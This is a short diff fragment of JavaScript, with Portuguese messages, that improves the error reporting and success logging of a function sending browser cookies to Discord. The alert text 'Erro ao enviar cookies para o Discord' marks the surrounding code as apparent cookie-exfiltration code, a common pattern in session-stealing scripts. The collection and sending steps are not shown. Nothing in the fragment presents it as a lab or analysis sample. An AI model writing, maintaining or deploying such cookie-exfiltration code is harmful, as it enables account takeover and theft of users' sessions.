@@ -50,12 +50,13 @@
             })
             .then(response => {
                 if (!response.ok) {
-                    throw new Error('Erro ao enviar mensagem para o Discord');
+                    throw new Error('Erro ao enviar mensagem para o Discord: ' + response.statusText);
                 }
+                console.log('Mensagem enviada com sucesso para o Discord!');
             })
             .catch(error => {
                 console.error('Erro:', error);
-                alert('Erro ao enviar cookies para o Discord!');
+                alert('Erro ao enviar cookies para o Discord: ' + error.message);
             });
         }
 
